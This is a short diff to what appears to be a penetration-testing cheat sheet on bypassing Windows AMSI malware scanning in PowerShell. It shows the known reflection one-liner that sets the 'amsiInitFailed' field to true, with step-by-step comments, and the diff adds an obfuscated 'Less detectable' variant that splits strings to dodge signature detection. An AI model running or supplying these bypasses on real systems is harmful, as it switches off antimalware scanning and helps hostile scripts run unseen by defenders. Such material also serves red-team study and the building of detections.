@@ -21,7 +21,7 @@ AmsiTrigger_x64.exe -i "bypass.ps1" -f 3      // Finds and bypasses the AMSI tri
 ```
 
 
-One-liner to bypass AMSI using Powershell reflection:
+One-liner to bypass AMSI using Powershell reflection (can get detected):
 ```powershell
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
@@ -29,4 +29,9 @@ One-liner to bypass AMSI using Powershell reflection:
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')   // Gets the AMSI-utilities in Powershell
 .GetField('amsiInitFailed','NonPublic,Static')                     // Get a specific field from the AMSI-utils section
 .SetValue($null,$true)                                             // Sets "amsiInitFailed" to True, so it will stop being checked
+```
+
+Less detectable:
+```powershell
+$a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)
 ```
